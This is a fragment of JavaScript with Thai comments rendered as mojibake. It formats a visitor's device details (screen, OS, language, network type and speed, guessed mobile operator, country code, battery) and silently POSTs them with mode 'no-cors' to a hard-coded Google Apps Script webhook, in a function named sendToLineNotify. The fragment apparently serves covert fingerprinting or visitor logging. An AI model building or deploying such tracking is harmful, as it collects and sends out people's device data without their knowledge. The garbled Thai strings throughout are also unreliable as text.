  // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏´‡∏ô‡πâ‡∏≤‡∏à‡∏≠
  message.push(`üìä‡∏Ç‡∏ô‡∏≤‡∏î‡∏´‡∏ô‡πâ‡∏≤‡∏à‡∏≠: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏£‡∏∞‡∏ö‡∏ö
  message.push(`üñ•Ô∏è‡∏£‡∏∞‡∏ö‡∏ö‡∏õ‡∏è‡∏¥‡∏ö‡∏±‡∏ï‡∏¥‡∏Å‡∏≤‡∏£: ${deviceData.platform}`);
  message.push(`üî§‡∏†‡∏≤‡∏©‡∏≤: ${deviceData.language}`);

  // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ (‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°)
  if (typeof deviceData.connection === 'object') {
    // ‡πÅ‡∏™‡∏î‡∏á‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ (WiFi ‡∏´‡∏£‡∏∑‡∏≠ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "üì∂" : "üì±";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`‚ö°‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡πÇ‡∏î‡∏¢‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ‡∏ñ‡πâ‡∏≤‡πÄ‡∏õ‡πá‡∏ô Mobile ‡πÉ‡∏´‡πâ‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`üìû‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ") {
        message.push(`üè¥‡∏£‡∏´‡∏±‡∏™‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®: ${phoneInfo.countryCode}`);
      }
      message.push(`üìù‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏: ${phoneInfo.remarks}`);
    }
  }

  // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà
  if (typeof deviceData.battery === 'object') {
    message.push(`üîã‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ‡∏¢‡∏±‡∏á webhook ‡πÅ‡∏•‡∏∞‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á‡∏ã‡πâ‡∏≥
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // üéØ‡∏™‡∏£‡πâ‡∏≤‡∏á requestId ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ô‡∏µ‡πâ
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ‡πÉ‡∏ä‡πâ sessionStorage ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á‡∏ã‡πâ‡∏≥‡πÉ‡∏ô‡∏ß‡∏¥‡∏ô‡πÇ‡∏î‡∏ß‡πå‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ô‡∏µ‡πâ‡πÄ‡∏Ñ‡∏¢‡∏™‡πà‡∏á‡πÅ‡∏•‡πâ‡∏ß (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ webhook (requestId: " + dataToSend.requestId + ")");

  // ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏õ‡∏¢‡∏±‡∏á Server ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à");
    
    // ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å requestId ‡∏ó‡∏µ‡πà‡∏™‡πà‡∏á‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡πÅ‡∏•‡πâ‡∏ß
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•:", error);
  });
}

// ‡∏™‡∏£‡πâ‡∏≤‡∏á unique ID ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏Å‡∏≤‡∏£‡∏£‡πâ‡∏≠‡∏á‡∏Ç‡∏≠
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
